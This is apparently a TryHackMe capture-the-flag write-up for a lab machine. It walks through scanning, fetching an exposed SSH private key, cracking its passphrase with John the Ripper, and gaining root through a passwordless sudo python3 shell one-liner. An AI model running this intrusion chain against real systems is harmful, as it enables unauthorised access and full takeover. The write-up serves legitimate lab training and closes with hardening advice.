# Shadow System — TryHackMe Write-Up

![Platform](https://img.shields.io/badge/Platform-TryHackMe-212c42?style=for-the-badge&logo=tryhackme&logoColor=white)
![OS](https://img.shields.io/badge/OS-Linux-FCC624?style=for-the-badge&logo=linux&logoColor=black)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy%20%2F%20Medium-2ea44f?style=for-the-badge)


Shadow System — TryHackMe Official Write-Up


Room Overview

Shadow System is an Easy-level Linux boot-to-root CTF machine by shadowxy focused on service discovery, web enumeration leading to an exposed SSH key, passphrase cracking, and a misconfigured sudo Python binary for root access.

1. Reconnaissance

• Nmap Scan: Identify open services (22/tcp SSH and 80/tcp HTTP).bash
nmap -sC -sV -oN nmap_scan.txt <TARGET_IP>
Kodu dikkatli kullanın.

2. Web Enumeration

• Gobuster & Robots.txt: Scan port 80 and check robots.txt to discover the username tom and an exposed /.ssh/id_rsa file.bash
gobuster dir -u http://<TARGET_IP> -w /usr/share/wordlists/dirb/common.txt
curl http://<TARGET_IP>/robots.txt
wget http://<TARGET_IP>/.ssh/id_rsa
Kodu dikkatli kullanın.

3. Cracking SSH Key & Initial Access

• John the Ripper: Prepare the key permissions, extract the hash with ssh2john, and crack the passphrase using rockyou.txt.bash
chmod 600 id_rsa
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
Kodu dikkatli kullanın.
• SSH Login & User Flag: Access the machine as tom and read user.txt.bash
ssh -i id_rsa tom@<TARGET_IP>
cat ~/user.txt
Kodu dikkatli kullanın.

	• User Flag: THM{<PASTE_YOUR_REAL_USER_FLAG_HERE>}

4. Privilege Escalation

• Sudo Rights: Check sudo -l to find that tom can run /usr/bin/python3 as root without a password.bash
sudo -l
Kodu dikkatli kullanın.
• GTFOBins Payload: Spawn a root shell via Python.bash
sudo python3 -c 'import os; os.system("/bin/bash")'
Kodu dikkatli kullanın.

5. Root Flag

• Root Access: Verify identity and read root.txt.bash
id
cat /root/root.txt
Kodu dikkatli kullanın.

	• Root Flag: THM{<PASTE_YOUR_REAL_ROOT_FLAG_HERE>}

Conclusion

Securing web directories against exposed SSH keys and auditing NOPASSWD sudo configurations on interpreters like Python are essential to prevent complete system takeovers.
